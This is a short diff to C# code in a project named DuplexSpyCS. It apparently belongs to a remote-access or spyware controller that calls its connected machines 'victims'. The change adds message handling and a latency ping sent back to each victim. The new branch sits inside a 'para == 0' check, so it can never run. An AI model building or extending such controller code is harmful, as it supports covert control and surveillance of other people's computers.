@@ -186,14 +186,31 @@ namespace DuplexSpyCS
                         }
                         else if (cmd == 2 && para == 0)
                         {
-                            try
+                            if (para == 0)
                             {
-                                string szPlain = Encoding.UTF8.GetString(msg);
-                                List<string> lsMsg = szPlain.Split('|').ToList();
-                                fnReceivedDecoded(this, victim, lsMsg);
+                                try
+                                {
+                                    string szPlain = Encoding.UTF8.GetString(msg);
+                                    List<string> lsMsg = szPlain.Split('|').ToList();
+                                    fnReceivedDecoded(this, victim, lsMsg);
+                                }
+                                catch (InvalidOperationException)
+                                {
+
+                                }
                             }
-                            catch (InvalidOperationException)
+                            else if (para == 1)
                             {
+                                Task.Run(() =>
+                                {
+                                    int nDelay = 1000;
+                                    DateTime datetime = DateTime.Now;
+                                    TimeSpan span = datetime - victim.last_sent;
+                                    victim.latency_time = span.Milliseconds;
+                                    victim.last_sent = datetime;
+
+                                    victim.fnSendCmdParam(2, 1);
+                                });
                             }
                         }
                     }
